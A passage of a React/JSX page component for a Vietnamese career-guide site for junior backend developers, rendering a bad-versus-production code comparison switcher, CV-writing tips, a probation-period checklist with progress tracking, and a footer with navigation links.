              <div style={{
                background: 'rgba(15, 23, 42, 0.7)',
                border: '1px solid rgba(255, 255, 255, 0.08)',
                borderRadius: '12px',
                padding: '22px',
                marginBottom: '22px'
              }}>
                <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', flexWrap: 'wrap', gap: '12px', marginBottom: '18px' }}>
                  <div>
                    <h2 style={{ margin: 0, fontSize: '1.5rem', color: '#fbbf24', display: 'flex', alignItems: 'center', gap: '8px' }}>
                      <span>⚔️</span> Trường Học vs Đi Làm: 8 Trận So Kèo Code Thực Chiến
                    </h2>
                    <p style={{ margin: '6px 0 0 0', fontSize: '14px', color: 'rgba(255, 255, 255, 0.75)' }}>
                      So sánh trực quan giữa thói quen viết code sinh viên/lý thuyết và tiêu chuẩn Production của doanh nghiệp.
                    </p>
                  </div>
                  <span style={{
                    padding: '6px 12px',
                    borderRadius: '6px',
                    background: 'rgba(251, 191, 36, 0.15)',
                    border: '1px solid rgba(251, 191, 36, 0.3)',
                    color: '#fbbf24',
                    fontSize: '13px',
                    fontWeight: 800
                  }}>
                    Trận {selectedBattleIndex + 1} / {CODE_BATTLES.length}
                  </span>
                </div>

                {/* Battle Switcher */}
                <div style={{ display: 'flex', gap: '10px', overflowX: 'auto', paddingBottom: '8px' }}>
                  {CODE_BATTLES.map((battle, idx) => (
                    <button
                      key={battle.id}
                      onClick={() => setSelectedBattleIndex(idx)}
                      style={{
                        padding: '9px 16px',
                        borderRadius: '8px',
                        background: selectedBattleIndex === idx ? 'rgba(251, 191, 36, 0.2)' : 'rgba(255, 255, 255, 0.04)',
                        border: `1px solid ${selectedBattleIndex === idx ? '#fbbf24' : 'rgba(255, 255, 255, 0.1)'}`,
                        color: selectedBattleIndex === idx ? '#fbbf24' : 'rgba(255, 255, 255, 0.75)',
                        fontWeight: selectedBattleIndex === idx ? 800 : 500,
                        fontSize: '13.5px',
                        cursor: 'pointer',
                        whiteSpace: 'nowrap',
                        transition: 'all 0.15s ease'
                      }}
                    >
                      {battle.title}
                    </button>
                  ))}
                </div>
              </div>

              {/* Current Battle Details Header */}
              {(() => {
                const currentBattle = CODE_BATTLES[selectedBattleIndex] || CODE_BATTLES[0];
                return (
                  <div>
                    <div style={{
                      display: 'flex',
                      alignItems: 'center',
                      justifyContent: 'space-between',
                      flexWrap: 'wrap',
                      gap: '12px',
                      marginBottom: '16px',
                      padding: '12px 18px',
                      borderRadius: '10px',
                      background: 'rgba(255, 255, 255, 0.03)',
                      border: '1px solid rgba(255, 255, 255, 0.06)'
                    }}>
                      <div style={{ display: 'flex', alignItems: 'center', gap: '10px' }}>
                        <span style={{
                          padding: '4px 10px',
                          borderRadius: '4px',
                          background: 'rgba(56, 189, 248, 0.15)',
                          color: '#38bdf8',
                          fontSize: '12.5px',
                          fontWeight: 800
                        }}>
                          {currentBattle.category}
                        </span>
                        <span style={{ fontSize: '16px', fontWeight: 800, color: '#ffffff' }}>
                          {currentBattle.title}
                        </span>
                      </div>

                      <span style={{
                        padding: '4px 12px',
                        borderRadius: '20px',
                        background: 'rgba(52, 211, 153, 0.15)',
                        border: '1px solid rgba(52, 211, 153, 0.3)',
                        color: '#34d399',
                        fontSize: '13px',
                        fontWeight: 800
                      }}>
                        ⚡ Tác động: {currentBattle.impactBadge}
                      </span>
                    </div>

                    {/* Battle Side-by-Side Showcase */}
                    <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(320px, 1fr))', gap: '18px', marginBottom: '18px' }}>
                      {/* Left: Bad Code */}
                      <div style={{
                        background: 'rgba(248, 113, 113, 0.04)',
                        border: '1px solid rgba(248, 113, 113, 0.3)',
                        borderRadius: '10px',
                        overflow: 'hidden',
                        display: 'flex',
                        flexDirection: 'column'
                      }}>
                        <div style={{ background: 'rgba(248, 113, 113, 0.15)', padding: '11px 16px', fontSize: '14px', fontWeight: 700, color: '#f87171' }}>
                          {currentBattle.badTitle}
                        </div>
                        <pre style={{ margin: 0, padding: '16px', fontSize: '13.5px', lineHeight: 1.6, background: 'transparent', color: '#fca5a5', overflowX: 'auto', flex: 1 }}>
                          <code>{currentBattle.badCode}</code>
                        </pre>
                        <div style={{ padding: '12px 16px', background: 'rgba(0, 0, 0, 0.25)', borderTop: '1px solid rgba(248, 113, 113, 0.2)', fontSize: '13.5px', color: 'rgba(255, 255, 255, 0.82)', lineHeight: 1.6 }}>
                          <strong style={{ color: '#f87171' }}>Hậu quả: </strong>{currentBattle.badExplanation}
                        </div>
                      </div>

                      {/* Right: Good Code */}
                      <div style={{
                        background: 'rgba(52, 211, 153, 0.04)',
                        border: '1px solid rgba(52, 211, 153, 0.3)',
                        borderRadius: '10px',
                        overflow: 'hidden',
                        display: 'flex',
                        flexDirection: 'column'
                      }}>
                        <div style={{ background: 'rgba(52, 211, 153, 0.15)', padding: '11px 16px', fontSize: '14px', fontWeight: 700, color: '#34d399' }}>
                          {currentBattle.goodTitle}
                        </div>
                        <pre style={{ margin: 0, padding: '16px', fontSize: '13.5px', lineHeight: 1.6, background: 'transparent', color: '#a7f3d0', overflowX: 'auto', flex: 1 }}>
                          <code>{currentBattle.goodCode}</code>
                        </pre>
                        <div style={{ padding: '12px 16px', background: 'rgba(0, 0, 0, 0.25)', borderTop: '1px solid rgba(52, 211, 153, 0.2)', fontSize: '13.5px', color: 'rgba(255, 255, 255, 0.82)', lineHeight: 1.6 }}>
                          <strong style={{ color: '#34d399' }}>Lợi ích Production: </strong>{currentBattle.goodExplanation}
                        </div>
                      </div>
                    </div>
                  </div>
                );
              })()}
            </div>
          )}

          {/* ======================================================== */}
          {/* TAB 4: BÍ KÍP VIẾT CV BACKEND */}
          {/* ======================================================== */}
          {activeMainTab === 'cv' && (
            <div>
              <div style={{
                background: 'rgba(15, 23, 42, 0.7)',
                border: '1px solid rgba(255, 255, 255, 0.08)',
                borderRadius: '12px',
                padding: '26px',
                marginBottom: '22px'
              }}>
                <h2 style={{ margin: '0 0 14px 0', fontSize: '1.6rem', color: '#a78bfa' }}>
                  📄 4 Tiêu Chuẩn Vàng Viết CV Cho Fresher / Junior
                </h2>
                <p style={{ margin: '0 0 22px 0', fontSize: '15px', color: 'rgba(255, 255, 255, 0.82)', lineHeight: 1.75 }}>
                  Technical Recruiter và Tech Lead chỉ dành trung bình <strong>6 giây</strong> để lướt qua một chiếc CV. Dưới đây là cách biến CV của bạn thành thỏi nam châm hút lịch phỏng vấn:
                </p>

                <div style={{ display: 'flex', flexDirection: 'column', gap: '18px' }}>
                  {CV_SECTIONS.map((sec, idx) => (
                    <div key={idx} style={{
                      background: 'rgba(255, 255, 255, 0.02)',
                      border: '1px solid rgba(255, 255, 255, 0.06)',
                      borderRadius: '10px',
                      padding: '18px'
                    }}>
                      <div style={{ fontSize: '16px', fontWeight: 800, color: '#38bdf8', marginBottom: '12px' }}>
                        {sec.sectionTitle}
                      </div>

                      <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(280px, 1fr))', gap: '16px', marginBottom: '14px' }}>
                        <div style={{ background: 'rgba(52, 211, 153, 0.06)', padding: '14px', borderRadius: '8px', border: '1px solid rgba(52, 211, 153, 0.2)' }}>
                          <div style={{ fontSize: '13.5px', fontWeight: 700, color: '#34d399', marginBottom: '8px' }}>
                            ✅ NÊN LÀM
                          </div>
                          <ul style={{ margin: 0, paddingLeft: '18px', fontSize: '14px', color: 'rgba(255, 255, 255, 0.88)', lineHeight: 1.7 }}>
                            {sec.doThis.map((d, i) => <li key={i}>{d}</li>)}
                          </ul>
                        </div>

                        <div style={{ background: 'rgba(248, 113, 113, 0.06)', padding: '14px', borderRadius: '8px', border: '1px solid rgba(248, 113, 113, 0.2)' }}>
                          <div style={{ fontSize: '13.5px', fontWeight: 700, color: '#f87171', marginBottom: '8px' }}>
                            ❌ TUYỆT ĐỐI TRÁNH
                          </div>
                          <ul style={{ margin: 0, paddingLeft: '18px', fontSize: '14px', color: 'rgba(255, 255, 255, 0.88)', lineHeight: 1.7 }}>
                            {sec.dontDoThis.map((d, i) => <li key={i}>{d}</li>)}
                          </ul>
                        </div>
                      </div>

                      <div style={{
                        background: 'rgba(0, 0, 0, 0.3)',
                        padding: '12px 16px',
                        borderRadius: '8px',
                        border: '1px solid rgba(255, 255, 255, 0.05)',
                        fontSize: '13.5px',
                        color: '#a7f3d0',
                        lineHeight: 1.6
                      }}>
                        {sec.exampleText}
                      </div>
                    </div>
                  ))}
                </div>
              </div>
            </div>
          )}

          {/* ======================================================== */}
          {/* TAB 5: CHECKLIST 60 NGÀY THỬ VIỆC */}
          {/* ======================================================== */}
          {activeMainTab === 'probation' && (
            <div>
              {/* Progress Bar */}
              <div style={{
                background: 'rgba(15, 23, 42, 0.7)',
                border: '1px solid rgba(255, 255, 255, 0.08)',
                borderRadius: '12px',
                padding: '22px',
                marginBottom: '22px'
              }}>
                <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '10px' }}>
                  <div style={{ fontSize: '16.5px', fontWeight: 800, color: '#ffffff' }}>
                    Tiến Độ Sẵn Sàng Vượt Qua 2 Tháng Thử Việc (Probation Survival Tracker)
                  </div>
                  <span style={{ fontSize: '20px', fontWeight: 900, color: progressPercent >= 70 ? '#34d399' : '#fbbf24' }}>
                    {completedCount} / {PROBATION_TASKS.length} ({progressPercent}%)
                  </span>
                </div>
                <div style={{ width: '100%', height: '10px', background: 'rgba(255, 255, 255, 0.1)', borderRadius: '5px', overflow: 'hidden' }}>
                  <div style={{
                    width: `${progressPercent}%`,
                    height: '100%',
                    background: progressPercent >= 70 ? 'linear-gradient(90deg, #34d399, #38bdf8)' : 'linear-gradient(90deg, #fbbf24, #f97316)',
                    transition: 'width 0.3s ease'
                  }} />
                </div>
              </div>

              {/* Tasks List */}
              <div style={{ display: 'flex', flexDirection: 'column', gap: '12px' }}>
                {PROBATION_TASKS.map((t) => {
                  const isChecked = !!checkedProbation[t.id];
                  return (
                    <div
                      key={t.id}
                      onClick={() => toggleCheck(t.id)}
                      style={{
                        display: 'flex',
                        alignItems: 'flex-start',
                        gap: '14px',
                        padding: '14px 18px',
                        borderRadius: '10px',
                        background: isChecked ? 'rgba(52, 211, 153, 0.08)' : 'rgba(255, 255, 255, 0.02)',
                        border: `1px solid ${isChecked ? 'rgba(52, 211, 153, 0.35)' : 'rgba(255, 255, 255, 0.08)'}`,
                        cursor: 'pointer',
                        transition: 'all 0.2s ease'
                      }}
                    >
                      <input
                        type="checkbox"
                        checked={isChecked}
                        onChange={() => {}}
                        style={{ marginTop: '4px', cursor: 'pointer', accentColor: '#34d399', width: '18px', height: '18px' }}
                      />
                      <div style={{ flex: 1 }}>
                        <div style={{ display: 'flex', alignItems: 'center', gap: '10px', marginBottom: '4px' }}>
                          <span style={{
                            fontSize: '12px',
                            fontWeight: 800,
                            padding: '2px 8px',
                            borderRadius: '4px',
                            background: t.phase.includes('Tuần 1') ? 'rgba(56, 189, 248, 0.2)' :
                                        t.phase.includes('Tuần 2-4') ? 'rgba(251, 191, 36, 0.2)' : 'rgba(167, 139, 250, 0.2)',
                            color: t.phase.includes('Tuần 1') ? '#38bdf8' :
                                   t.phase.includes('Tuần 2-4') ? '#fbbf24' : '#a78bfa'
                          }}>
                            {t.phase}
                          </span>
                          <span style={{ fontSize: '15px', fontWeight: 700, color: isChecked ? '#a7f3d0' : '#ffffff' }}>
                            {t.text}
                          </span>
                        </div>
                        <div style={{ fontSize: '13.5px', color: 'rgba(255, 255, 255, 0.72)', lineHeight: 1.55 }}>
                          {t.desc}
                        </div>
                      </div>
                    </div>
                  );
                })}
              </div>
            </div>
          )}

          {/* ======================================================== */}
          {/* FOOTER CALLOUT BANNER */}
          {/* ======================================================== */}
          <div style={{
            marginTop: '44px',
            background: 'linear-gradient(135deg, rgba(56, 189, 248, 0.1) 0%, rgba(52, 211, 153, 0.1) 100%)',
            border: '1px solid rgba(56, 189, 248, 0.3)',
            borderRadius: '14px',
            padding: '28px',
            textAlign: 'center'
          }}>
            <h3 style={{ margin: '0 0 10px 0', fontSize: '1.45rem', color: '#ffffff' }}>
              Kiến thức vững vàng — Tự tin bước vào dự án thực tế
            </h3>
            <p style={{ margin: '0 0 20px 0', fontSize: '1.1rem', color: 'rgba(255, 255, 255, 0.8)', maxWidth: '720px', marginInline: 'auto', lineHeight: 1.7 }}>
              Hãy đào sâu từng chủ đề, viết code mẫu và chạy thử nghiệm trên máy của bạn. Chúc bạn sớm nhận được Offer và vượt qua thử việc xuất sắc!
            </p>
            <div style={{ display: 'flex', justifyContent: 'center', gap: '14px', flexWrap: 'wrap' }}>
              <Link
                to="/technical-knowledge/java/java-overview"
                style={{
                  background: '#38bdf8',
                  color: '#000000',
                  padding: '10px 24px',
                  borderRadius: '8px',
                  fontWeight: 800,
                  fontSize: '14.5px',
                  textDecoration: 'none'
                }}
              >
                Khám Phá Toàn Bộ Java Docs →
              </Link>
              <Link
                to="/arcade"
                style={{
                  background: 'rgba(255, 255, 255, 0.05)',
                  border: '1px solid rgba(255, 255, 255, 0.2)',
                  color: '#ffffff',
                  padding: '10px 24px',
                  borderRadius: '8px',
                  fontWeight: 600,
                  fontSize: '14.5px',
                  textDecoration: 'none'
                }}
              >
                Luyện Tập Tại Arcade 🕹️
              </Link>
            </div>
          </div>

        </div>
      </div>
    </Layout>
  );
}
